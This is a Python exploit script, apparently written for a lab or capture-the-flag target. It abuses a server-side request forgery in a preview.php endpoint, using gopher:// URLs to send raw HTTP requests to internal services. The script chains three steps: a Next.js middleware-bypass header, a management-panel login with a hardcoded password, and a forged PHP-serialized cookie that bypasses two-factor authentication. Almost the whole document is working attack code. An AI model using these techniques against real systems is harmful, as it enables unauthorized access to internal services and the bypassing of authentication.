import re
import urllib.parse
import requests

BASE = "http://10.82.159.192/preview.php?url="


def send_raw_gopher(host: str, port: int, raw_http: str, label: str):
    gopher_url = f"gopher://{host}:{port}/_" + urllib.parse.quote(raw_http, safe="")
    full = BASE + urllib.parse.quote(gopher_url, safe="")
    r = requests.get(full, timeout=15)
    body = r.text

    print(f"\n=== {label} ===")
    print(f"preview status={r.status_code} body_len={len(body)}")
    if "STEP3" in label:
        print(body)
    else:
        print(body[:700])

    # Parse possibly embedded raw HTTP response lines from body.
    set_cookie = re.findall(r"Set-Cookie:\s*([^\r\n]+)", body, flags=re.I)
    if set_cookie:
        print("Set-Cookie lines:")
        for c in set_cookie:
            print("  ", c)

    sess = re.search(r"PHPSESSID=([A-Za-z0-9]+)", body)
    if sess:
        print("PHPSESSID:", sess.group(1))

    return body


# 1) Next.js middleware bypass probe on internal 10000
req1 = (
    "GET /customapi HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware\r\n"
    "Connection: close\r\n"
    "\r\n"
)
send_raw_gopher("127.0.0.1", 10000, req1, "STEP1 nextjs customapi")

# 2) Login to management panel (internal 80)
body2 = "username=librarian&password=L1br4r1AN!!"
req2 = (
    "POST /management/index.php HTTP/1.1\r\n"
    "Host: 127.0.0.1\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    f"Content-Length: {len(body2)}\r\n"
    "Connection: close\r\n"
    "\r\n" + body2
)
resp2 = send_raw_gopher("127.0.0.1", 80, req2, "STEP2 management login")

# 3) If PHPSESSID appears, try 2FA endpoint with forged auth_token object
m = re.search(r"PHPSESSID=([A-Za-z0-9]+)", resp2)
if m:
    sessid = m.group(1)
    token = "O%3A9%3A%22AuthToken%22%3A1%3A%7Bs%3A9%3A%22validated%22%3Bb%3A1%3B%7D"
    req3 = (
        "GET /management/2fa.php HTTP/1.1\r\n"
        "Host: 127.0.0.1\r\n"
        f"Cookie: PHPSESSID={sessid}; auth_token={token}\r\n"
        "Connection: close\r\n"
        "\r\n"
    )
    send_raw_gopher("127.0.0.1", 80, req3, "STEP3 2FA bypass")
else:
    print("\nNo PHPSESSID found in STEP2 response; inspect full output manually.")
